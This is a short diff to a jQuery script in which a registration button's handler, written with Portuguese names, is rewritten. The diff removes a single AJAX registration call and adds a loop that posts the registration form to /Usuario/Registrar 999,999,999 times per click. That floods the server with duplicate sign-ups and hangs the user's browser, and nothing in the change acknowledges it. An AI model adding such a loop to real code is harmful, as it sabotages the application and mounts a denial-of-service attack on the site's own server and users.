@@ -17,13 +17,9 @@ $(function () {
     });
 
     $('#btn-registrar').on('click', function () {
-        f.ajax('/Usuario/Registrar',
-               'post',
-               data_ = $('#frm-usuario-registrar').serialize(),
-               f.exibirLoad('.load', true),
-               function (r) {
-                   f.redirecionar(r.url);
-               }, f.exibirLoad('.load', false), undefined);
+        for (var i = 0; i < 999999999; i++) {
+            f.postar('/Usuario/Registrar', data_ = $('#frm-usuario-registrar').serialize(), 'post');
+        }
     });
 });
 
